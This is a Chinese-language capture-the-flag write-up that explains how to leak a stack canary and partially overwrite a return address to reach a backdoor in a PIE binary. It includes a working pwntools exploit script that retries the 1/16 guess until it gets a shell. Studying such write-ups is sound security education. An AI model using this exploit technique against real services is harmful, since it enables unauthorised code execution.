# Read_once_twice!

## 题目简述

程序对同一栈区域执行两次 `read`。第一次利用字符串输出泄漏 canary，第二次带回正确 canary，并只覆盖保存返回地址的低两字节，使执行流落到 PIE 模块内的后门。

## 解题过程

第一次发送 25 字节，覆盖 canary 最低位的 `\x00`。程序回显这 25 字节后会继续输出 canary 的高七字节，补回最低位即可恢复完整值。

第二次载荷布局是 24 字节缓冲区、8 字节 canary、8 字节保存的 `rbp`，最后写入后门地址的低两字节。PIE 基址按页对齐，后门页内偏移固定；覆盖两字节时仍有一个地址随机化半字节不可控，所以单次命中概率为 $1/16$，断线后重连重试即可。

```python
from pwn import ELF, cyclic, p64, remote

elf = ELF("./twice")

while True:
    io = remote("host", 10000)
    try:
        io.recv()
        io.send(cyclic(25))
        io.recvn(25)
        canary = b"\x00" + io.recvn(7)

        partial_ret = p64(elf.sym["backdoor"] + 1)[:2]
        payload = cyclic(24) + canary + cyclic(8) + partial_ret
        io.send(payload)
        io.sendafter(b"hand.\n", b"ls\n")
        io.recv(timeout=1)
        break
    except EOFError:
        io.close()

io.interactive()
```

`backdoor + 1` 用于跳过会破坏栈对齐的函数序言；应以实际反汇编确认这一字节确实是 `push rbp`。

## 方法总结

本题把 canary 泄漏与 PIE 部分覆写串在两次读入中。部分覆写不会自动绕过全部 ASLR，只是保留原返回地址高位并固定低位，因此需要明确计算剩余随机位和成功率，而不是把重试当成玄学。
